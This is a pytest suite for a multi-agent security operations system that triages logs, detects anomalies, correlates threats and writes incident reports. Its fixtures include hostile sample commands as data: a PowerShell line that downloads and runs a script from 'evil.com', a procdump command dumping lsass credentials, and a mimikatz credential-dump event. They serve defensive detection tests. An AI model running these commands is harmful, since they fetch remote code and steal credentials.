"""
Comprehensive pytest test suite for the SOC AI Multi-Agent System.
Run with:  pytest tests/test_agents.py -v
"""

import json
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

from agents import (
    LogTriageAgent,
    AnomalyDetectionAgent,
    ThreatCorrelationAgent,
    MitigationPlanningAgent,
    IncidentReportAgent,
    SOCOrchestrator,
)


# ══════════════════════════════════════════════════════════════════════════════
# Fixtures
# ══════════════════════════════════════════════════════════════════════════════

@pytest.fixture
def triage_agent():
    return LogTriageAgent()

@pytest.fixture
def anomaly_agent():
    return AnomalyDetectionAgent()

@pytest.fixture
def correlation_agent():
    return ThreatCorrelationAgent()

@pytest.fixture
def mitigation_agent():
    return MitigationPlanningAgent()

@pytest.fixture
def report_agent():
    return IncidentReportAgent()

@pytest.fixture
def orchestrator():
    return SOCOrchestrator()


# ══════════════════════════════════════════════════════════════════════════════
# 1. Log Triage Agent Tests
# ══════════════════════════════════════════════════════════════════════════════

class TestLogTriageAgent:

    def test_brute_force_log(self, triage_agent):
        log = "Jun 01 02:14:33 ws01 sshd: Failed password for root from 198.51.100.22 port 52341"
        result = triage_agent.run({"raw_log": log})
        assert result["status"] == "success"
        out = result["result"]
        assert out["severity"] in ("High", "Critical")
        assert out["escalation_recommendation"] == "Escalate"
        assert out["initial_assessment"]["classification"] == "Authentication"

    def test_benign_logon(self, triage_agent):
        log = "2024-06-01T09:00:01Z host=dc01 EventID=4624 Account=CORP\\jsmith LogonType=3 SourceIP=10.0.1.50"
        result = triage_agent.run({"raw_log": log})
        assert result["status"] == "success"
        out = result["result"]
        assert out["severity"] in ("Informational", "Low")
        assert out["escalation_recommendation"] == "Close"

    def test_powershell_iex(self, triage_agent):
        log = '2024-06-01T14:10:00Z host=ws22 EventID=4688 process=powershell.exe cmdline=IEX(New-Object Net.WebClient).DownloadString user=CORP\\bob'
        result = triage_agent.run({"raw_log": log})
        out = result["result"]
        assert out["severity"] == "Critical"
        assert out["escalation_recommendation"] == "Escalate"

    def test_cloud_console_login_no_mfa(self, triage_agent):
        log = "2024-06-01T11:05:00Z aws_account=123456789 event=ConsoleLogin user=devops@corp.com result=Success mfa=false src_ip=203.0.113.77"
        result = triage_agent.run({"raw_log": log})
        out = result["result"]
        assert out["severity"] in ("High", "Critical")
        assert out["initial_assessment"]["classification"] in ("Cloud", "Authentication")

    def test_dns_tunneling(self, triage_agent):
        log = "2024-06-01T14:22:05Z src=10.10.5.200 dst=8.8.8.8 proto=UDP dport=53 query=aHR0cHM6Ly9ldmlsLmNvbQ==.malicious.com"
        result = triage_agent.run({"raw_log": log})
        out = result["result"]
        assert out["severity"] == "Critical"

    def test_privilege_escalation_event(self, triage_agent):
        log = "2024-06-01T02:18:00Z host=dc01 EventID=4728 user=hacker group=Domain Admins"
        result = triage_agent.run({"raw_log": log})
        out = result["result"]
        assert out["severity"] == "Critical"

    def test_ip_extraction(self, triage_agent):
        log = "Jun 01 02:14:33 ws01 sshd: Failed password for root from 198.51.100.22 port 52341"
        result = triage_agent.run({"raw_log": log})
        indicators = result["result"]["extracted_indicators"]
        assert indicators.get("source_ip") == "198.51.100.22"

    def test_malware_indicator(self, triage_agent):
        log = "2024-06-01T15:00:00Z host=ws10 process=mimikatz.exe action=credential_dump user=CORP\\admin"
        result = triage_agent.run({"raw_log": log})
        out = result["result"]
        assert out["severity"] == "Critical"

    def test_string_input(self, triage_agent):
        result = triage_agent.run("Failed password for root from 10.0.0.1")
        assert result["status"] == "success"

    def test_empty_input_handled(self, triage_agent):
        result = triage_agent.run({})
        assert result["status"] == "success"
        assert "severity" in result["result"]

    def test_output_structure(self, triage_agent):
        result = triage_agent.run({"raw_log": "Failed password for root from 1.2.3.4"})
        out = result["result"]
        for key in ("event_summary", "extracted_indicators", "initial_assessment", "severity",
                    "escalation_recommendation", "reasoning"):
            assert key in out, f"Missing key: {key}"


# ══════════════════════════════════════════════════════════════════════════════
# 2. Anomaly Detection Agent Tests
# ══════════════════════════════════════════════════════════════════════════════

class TestAnomalyDetectionAgent:

    def _brute_force_events(self):
        return [
            {"time": f"03:14:2{i}", "user": f"user{i}", "src_ip": "5.188.210.55",
             "action": "SSH login", "result": "Failed", "host": "dc01"}
            for i in range(5)
        ]

    def test_brute_force_detection(self, anomaly_agent):
        events = [
            {"user": "admin", "src_ip": "10.0.0.1", "result": "Failed"},
            {"user": "admin", "src_ip": "10.0.0.1", "result": "Failed"},
            {"user": "admin", "src_ip": "10.0.0.1", "result": "Failed"},
            {"user": "admin", "src_ip": "10.0.0.1", "result": "Failed"},
            {"user": "admin", "src_ip": "10.0.0.1", "result": "Failed"},
        ]
        result = anomaly_agent.run({"events": events})
        out = result["result"]
        types = [a["anomaly_type"] for a in out.get("detected_anomalies", [])]
        assert any("Brute Force" in t for t in types)

    def test_password_spray_detection(self, anomaly_agent):
        events = [
            {"user": f"user{i}", "src_ip": "5.5.5.5", "result": "Failed"}
            for i in range(6)
        ]
        result = anomaly_agent.run({"events": events})
        out = result["result"]
        types = [a["anomaly_type"] for a in out.get("detected_anomalies", [])]
        assert any("Spray" in t or "Brute Force" in t for t in types)

    def test_impossible_travel_detection(self, anomaly_agent):
        events = [
            {"user": "ceo@corp.com", "src_ip": "203.0.113.5",  "location": "New York", "result": "Success"},
            {"user": "ceo@corp.com", "src_ip": "185.220.101.40", "location": "Moscow",   "result": "Success"},
        ]
        result = anomaly_agent.run({"events": events})
        out = result["result"]
        types = [a["anomaly_type"] for a in out.get("detected_anomalies", [])]
        assert any("Travel" in t for t in types)

    def test_powershell_detection(self, anomaly_agent):
        events = [{
            "host": "ws22", "process": "powershell.exe",
            "cmdline": "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')",
            "user": "CORP\\bob"
        }]
        result = anomaly_agent.run({"events": events})
        out = result["result"]
        types = [a["anomaly_type"] for a in out.get("detected_anomalies", [])]
        assert any("PowerShell" in t for t in types)

    def test_cloud_priv_escalation(self, anomaly_agent):
        events = [
            {"user": "svc_backup", "action": "CreateAccessKey", "result": "Success"},
            {"user": "svc_backup", "action": "AttachUserPolicy", "policy": "AdministratorAccess"},
        ]
        result = anomaly_agent.run({"events": events})
        out = result["result"]
        types = [a["anomaly_type"] for a in out.get("detected_anomalies", [])]
        assert any("Cloud" in t or "Privilege" in t for t in types)

    def test_off_hours_detection(self, anomaly_agent):
        events = [{"time": "02:30:00", "user": "jdoe", "host": "ws01", "result": "Success"}]
        result = anomaly_agent.run({"events": events})
        out = result["result"]
        types = [a["anomaly_type"] for a in out.get("detected_anomalies", [])]
        assert any("Off-Hours" in t or "off" in t.lower() for t in types)

    def test_credential_dumping_detection(self, anomaly_agent):
        events = [{"host": "dc01", "process": "procdump.exe", "cmdline": "procdump -ma lsass.exe lsass.dmp", "user": "CORP\\admin"}]
        result = anomaly_agent.run({"events": events})
        out = result["result"]
        types = [a["anomaly_type"] for a in out.get("detected_anomalies", [])]
        assert any("Credential" in t for t in types)

    def test_output_structure(self, anomaly_agent):
        result = anomaly_agent.run({"events": []})
        out = result["result"]
        for key in ("detected_anomalies", "total_anomalies", "overall_threat_assessment",
                    "recommended_next_steps"):
            assert key in out, f"Missing key: {key}"

    def test_no_anomalies_clean_input(self, anomaly_agent):
        result = anomaly_agent.run({"events": [{"action": "read_file", "result": "Success"}]})
        out = result["result"]
        assert isinstance(out["detected_anomalies"], list)

    def test_lateral_movement_detection(self, anomaly_agent):
        events = [{"src_host": "dc01", "dst_host": "fin-srv02", "method": "WMI", "user": "hacker"}]
        result = anomaly_agent.run({"events": events})
        out = result["result"]
        types = [a["anomaly_type"] for a in out.get("detected_anomalies", [])]
        assert any("Lateral" in t for t in types)


# ══════════════════════════════════════════════════════════════════════════════
# 3. Threat Correlation Agent Tests
# ══════════════════════════════════════════════════════════════════════════════

class TestThreatCorrelationAgent:

    def _full_attack_anomalies(self):
        return [
            {"anomaly_type": "Brute Force Authentication", "description": "5 failed SSH attempts", "confidence": 0.95, "risk": "High"},
            {"anomaly_type": "Privilege Escalation — Domain Admin", "description": "hacker added to Domain Admins", "confidence": 0.97, "risk": "Critical"},
            {"anomaly_type": "Lateral Movement", "description": "WMI from dc01 to fin-srv02", "confidence": 0.90, "risk": "High"},
            {"anomaly_type": "Data Exfiltration", "description": "450MB sent to external IP", "confidence": 0.88, "risk": "Critical"},
        ]

    def test_stage_mapping(self, correlation_agent):
        result = correlation_agent.run({"anomalies": self._full_attack_anomalies(), "events": []})
        out = result["result"]
        stages = {e.get("attack_stage") for e in out.get("correlated_events", [])}
        assert "Initial Access" in stages or "Privilege Escalation" in stages

    def test_mitre_mapping_present(self, correlation_agent):
        result = correlation_agent.run({"anomalies": self._full_attack_anomalies(), "events": []})
        out = result["result"]
        assert len(out.get("mitre_attack_mapping", [])) > 0

    def test_timeline_built(self, correlation_agent):
        result = correlation_agent.run({"anomalies": self._full_attack_anomalies(), "events": []})
        out = result["result"]
        assert len(out.get("attack_timeline", [])) > 0

    def test_narrative_generated(self, correlation_agent):
        result = correlation_agent.run({"anomalies": self._full_attack_anomalies(), "events": []})
        out = result["result"]
        assert len(out.get("attack_narrative", "")) > 20

    def test_objectives_inferred(self, correlation_agent):
        result = correlation_agent.run({"anomalies": self._full_attack_anomalies(), "events": []})
        out = result["result"]
        assert len(out.get("potential_attacker_objectives", [])) > 0

    def test_confidence_label(self, correlation_agent):
        result = correlation_agent.run({"anomalies": self._full_attack_anomalies(), "events": []})
        out = result["result"]
        conf = out.get("confidence_level", "")
        assert any(label in conf for label in ("Low", "Medium", "High"))

    def test_empty_input(self, correlation_agent):
        result = correlation_agent.run({"anomalies": [], "events": []})
        assert result["status"] == "success"

    def test_indicator_indexing(self, correlation_agent):
        anomalies = [{"anomaly_type": "Brute Force", "evidence": {"source_ip": "1.2.3.4", "user": "admin"}}]
        result = correlation_agent.run({"anomalies": anomalies, "events": []})
        indicators = result["result"].get("shared_indicators", {})
        assert "1.2.3.4" in indicators.get("ips", [])

    def test_output_structure(self, correlation_agent):
        result = correlation_agent.run({"anomalies": [], "events": []})
        out = result["result"]
        for key in ("correlated_events", "attack_timeline", "attack_narrative",
                    "mitre_attack_mapping", "confidence_level", "potential_attacker_objectives"):
            assert key in out, f"Missing key: {key}"

    def test_mitre_deduplication(self, correlation_agent):
        anomalies = [
            {"anomaly_type": "Brute Force Authentication", "confidence": 0.9},
            {"anomaly_type": "Brute Force Authentication", "confidence": 0.95},
        ]
        result = correlation_agent.run({"anomalies": anomalies, "events": []})
        mitre = result["result"].get("mitre_attack_mapping", [])
        ids = [m["technique_id"] for m in mitre]
        assert len(ids) == len(set(ids)), "Duplicate MITRE techniques found"


# ══════════════════════════════════════════════════════════════════════════════
# 4. Mitigation Planning Agent Tests
# ══════════════════════════════════════════════════════════════════════════════

class TestMitigationPlanningAgent:

    def _ransomware_input(self):
        return {
            "severity": "Critical",
            "attack_type": "Ransomware",
            "affected_hosts": ["ws01", "ws02", "fin-srv02"],
            "lateral_movement_confirmed": True,
        }

    def test_immediate_actions_generated(self, mitigation_agent):
        result = mitigation_agent.run(self._ransomware_input())
        out = result["result"]
        assert len(out.get("immediate_actions", {})) > 0

    def test_short_term_generated(self, mitigation_agent):
        result = mitigation_agent.run(self._ransomware_input())
        out = result["result"]
        assert len(out.get("short_term_remediation", [])) > 0

    def test_long_term_generated(self, mitigation_agent):
        result = mitigation_agent.run(self._ransomware_input())
        out = result["result"]
        assert len(out.get("long_term_hardening", [])) > 0

    def test_detection_rules_generated(self, mitigation_agent):
        result = mitigation_agent.run(self._ransomware_input())
        out = result["result"]
        assert len(out.get("detection_improvements", [])) > 0

    def test_validation_steps_present(self, mitigation_agent):
        result = mitigation_agent.run(self._ransomware_input())
        out = result["result"]
        assert len(out.get("validation_steps", [])) > 0

    def test_residual_risk_non_empty(self, mitigation_agent):
        result = mitigation_agent.run(self._ransomware_input())
        out = result["result"]
        assert len(out.get("residual_risk", "")) > 5

    def test_brute_force_specific_actions(self, mitigation_agent):
        inp = {"severity": "High", "attack_type": "brute force", "anomaly": "brute force authentication"}
        result = mitigation_agent.run(inp)
        out = result["result"]
        all_actions = json.dumps(out).lower()
        assert "block" in all_actions or "lockout" in all_actions

    def test_cloud_specific_actions(self, mitigation_agent):
        inp = {"severity": "Critical", "attack_type": "cloud priv escalation"}
        result = mitigation_agent.run(inp)
        out = result["result"]
        all_actions = json.dumps(out).lower()
        assert "iam" in all_actions or "key" in all_actions or "cloud" in all_actions

    def test_empty_input_safe(self, mitigation_agent):
        result = mitigation_agent.run({})
        assert result["status"] == "success"

    def test_output_structure(self, mitigation_agent):
        result = mitigation_agent.run({"severity": "High"})
        out = result["result"]
        for key in ("immediate_actions", "short_term_remediation", "long_term_hardening",
                    "detection_improvements", "validation_steps", "residual_risk"):
            assert key in out, f"Missing key: {key}"


# ══════════════════════════════════════════════════════════════════════════════
# 5. Incident Report Agent Tests
# ══════════════════════════════════════════════════════════════════════════════

class TestIncidentReportAgent:

    def _full_report_input(self):
        return {
            "incident_id": "INC-2024-001",
            "severity": "Critical",
            "type": "Data Exfiltration",
            "status": "Contained",
            "iocs": {"ips": ["198.51.100.22", "45.33.32.156"], "accounts": ["hacker"]},
            "affected_hosts": ["dc01", "fin-srv02"],
            "triage": {"severity": "Critical", "extracted_indicators": {"source_ip": "198.51.100.22"}},
            "anomaly": {"detected_anomalies": [{"anomaly_type": "Data Exfiltration", "description": "450MB sent", "confidence": 0.88, "risk": "Critical"}]},
            "correlation": {
                "confidence_level": "High (0.91)",
                "attack_narrative": "Attacker compromised admin, escalated privileges, moved laterally, exfiltrated data.",
                "mitre_attack_mapping": [{"technique_id": "T1041", "technique_name": "Exfil over C2", "confidence": 0.88}],
                "attack_timeline": [{"time": "02:14", "stage": "Initial Access", "event": "Brute force success", "technique": "T1110.001"}],
                "potential_attacker_objectives": ["Data theft"],
                "correlated_events": [{"attack_stage": "Initial Access", "technique_id": "T1110", "technique_name": "BF", "description": "BF", "confidence": 0.9}],
                "shared_indicators": {"ips": ["198.51.100.22"], "users": ["hacker"]},
            },
            "mitigation": {
                "immediate_actions": {"P1": ["Block source IP", "Revoke compromised accounts"]},
                "short_term_remediation": ["Reset all domain passwords"],
                "long_term_hardening": ["Deploy MFA everywhere"],
            },
        }

    def test_report_generated(self, report_agent):
        result = report_agent.run(self._full_report_input())
        assert result["status"] == "success"

    def test_incident_id_set(self, report_agent):
        result = report_agent.run(self._full_report_input())
        out = result["result"]
        assert out.get("incident_id") == "INC-2024-001"

    def test_executive_summary_non_empty(self, report_agent):
        result = report_agent.run(self._full_report_input())
        out = result["result"]
        assert len(out.get("executive_summary", "")) > 20

    def test_iocs_present(self, report_agent):
        result = report_agent.run(self._full_report_input())
        out = result["result"]
        iocs = out.get("indicators_of_compromise", {})
        assert "198.51.100.22" in iocs.get("ips", [])

    def test_markdown_report_generated(self, report_agent):
        result = report_agent.run(self._full_report_input())
        md = result["result"].get("markdown_report", "")
        assert "# INCIDENT REPORT" in md
        assert "## Executive Summary" in md
        assert "## MITRE ATT&CK Mapping" in md

    def test_recommendations_present(self, report_agent):
        result = report_agent.run(self._full_report_input())
        recs = result["result"].get("recommendations", {})
        assert len(recs) > 0

    def test_root_cause_structure(self, report_agent):
        result = report_agent.run(self._full_report_input())
        rca = result["result"].get("root_cause_analysis", {})
        for key in ("known_facts", "assumptions", "unknowns"):
            assert key in rca

    def test_final_assessment_non_empty(self, report_agent):
        result = report_agent.run(self._full_report_input())
        out = result["result"]
        assert len(out.get("final_assessment", "")) > 20

    def test_auto_incident_id(self, report_agent):
        result = report_agent.run({"severity": "High"})
        out = result["result"]
        assert out.get("incident_id", "").startswith("INC-")

    def test_output_structure(self, report_agent):
        result = report_agent.run(self._full_report_input())
        out = result["result"]
        for key in ("incident_id", "executive_summary", "incident_overview", "affected_assets",
                    "indicators_of_compromise", "timeline", "technical_analysis",
                    "mitre_attack_mapping", "impact_assessment", "root_cause_analysis",
                    "recommendations", "final_assessment", "markdown_report"):
            assert key in out, f"Missing key: {key}"


# ══════════════════════════════════════════════════════════════════════════════
# 6. SOC Orchestrator (Full Pipeline) Tests
# ══════════════════════════════════════════════════════════════════════════════

class TestSOCOrchestrator:

    def _attack_scenario(self):
        return {
            "raw_log": "Jun 01 02:14:33 dc01 sshd: Failed password for root from 198.51.100.22",
            "events": [
                {"time": f"02:14:3{i}", "user": ["admin","root","guest","test"][i % 4],
                 "src_ip": "198.51.100.22", "action": "SSH login", "result": "Failed", "host": "dc01"}
                for i in range(5)
            ] + [
                {"time": "02:20:00", "src_host": "dc01", "dst_host": "fin-srv02", "user": "hacker", "method": "WMI"},
                {"time": "03:00:00", "host": "fin-srv02", "dst_ip": "45.33.32.156", "size_mb": 450},
            ],
        }

    def test_pipeline_completes(self, orchestrator):
        result = orchestrator.run(self._attack_scenario())
        assert result["status"] == "success"

    def test_executive_summary_present(self, orchestrator):
        result = orchestrator.run(self._attack_scenario())
        summary = result["result"].get("executive_summary", "")
        assert len(summary) > 20

    def test_severity_assigned(self, orchestrator):
        result = orchestrator.run(self._attack_scenario())
        assert result["result"].get("severity") in ("Low","Medium","High","Critical","Informational")

    def test_key_findings_present(self, orchestrator):
        result = orchestrator.run(self._attack_scenario())
        findings = result["result"].get("key_findings", [])
        assert len(findings) > 0

    def test_all_agent_outputs_present(self, orchestrator):
        result = orchestrator.run(self._attack_scenario())
        agent_outputs = result["result"].get("agent_outputs", {})
        for key in ("log_triage", "anomaly_detection", "threat_correlation", "mitigation_planning"):
            assert key in agent_outputs, f"Missing agent output: {key}"

    def test_pipeline_log_recorded(self, orchestrator):
        result = orchestrator.run(self._attack_scenario())
        log = result["result"].get("pipeline_log", [])
        assert len(log) > 0

    def test_early_close_benign(self, orchestrator):
        benign = {"raw_log": "2024-06-01T09:00:01Z host=dc01 EventID=4624 Account=CORP\\jsmith LogonType=3 SourceIP=10.0.1.50"}
        result = orchestrator.run(benign)
        out = result["result"]
        assert out["severity"] in ("Informational", "Low")
        # Early close should not run all 5 steps
        steps = [e.get("step", "") for e in out.get("pipeline_log", [])]
        assert any("Close" in s or "Triage" in s for s in steps)

    def test_qc_notes_present(self, orchestrator):
        result = orchestrator.run(self._attack_scenario())
        qc = result["result"].get("quality_control_notes", [])
        assert len(qc) > 0

    def test_incident_report_nested(self, orchestrator):
        result = orchestrator.run(self._attack_scenario())
        report = result["result"].get("incident_report", {})
        assert isinstance(report, dict)

    def test_elapsed_time_tracked(self, orchestrator):
        result = orchestrator.run(self._attack_scenario())
        elapsed = result["result"].get("pipeline_elapsed_sec", -1)
        assert elapsed >= 0


# ══════════════════════════════════════════════════════════════════════════════
# Edge case & integration tests
# ══════════════════════════════════════════════════════════════════════════════

class TestEdgeCases:

    def test_all_agents_handle_none(self):
        for AgentClass in (LogTriageAgent, AnomalyDetectionAgent, ThreatCorrelationAgent,
                           MitigationPlanningAgent, IncidentReportAgent, SOCOrchestrator):
            agent = AgentClass()
            result = agent.run(None)
            assert result["status"] in ("success", "error"), f"{AgentClass.__name__} returned unexpected status"

    def test_all_agents_handle_empty_dict(self):
        for AgentClass in (LogTriageAgent, AnomalyDetectionAgent, ThreatCorrelationAgent,
                           MitigationPlanningAgent, IncidentReportAgent, SOCOrchestrator):
            agent = AgentClass()
            result = agent.run({})
            assert "status" in result

    def test_run_log_history(self):
        agent = LogTriageAgent()
        agent.run({"raw_log": "test log entry"})
        agent.run({"raw_log": "another test"})
        history = agent.get_run_history()
        assert len(history) == 2

    def test_base_agent_repr(self):
        agent = LogTriageAgent()
        r = repr(agent)
        assert "LogTriageAgent" in r

    def test_severity_score_ordering(self):
        from agents.base_agent import BaseAgent
        agent = BaseAgent("test", "test")
        assert agent.severity_score("critical") > agent.severity_score("high")
        assert agent.severity_score("high") > agent.severity_score("medium")
        assert agent.severity_score("low") > agent.severity_score("informational")

    def test_ip_extraction_utility(self):
        from agents.base_agent import BaseAgent
        agent = BaseAgent("test", "test")
        ips = agent.extract_ips("Traffic from 192.168.1.1 to 10.0.0.5 via 8.8.8.8")
        assert "192.168.1.1" in ips
        assert "10.0.0.5" in ips

    def test_large_event_list(self):
        agent = AnomalyDetectionAgent()
        events = [
            {"user": "admin", "src_ip": "10.0.0.1", "result": "Failed", "time": f"0{h}:00:00"}
            for h in range(8)
        ]
        result = agent.run({"events": events})
        assert result["status"] == "success"
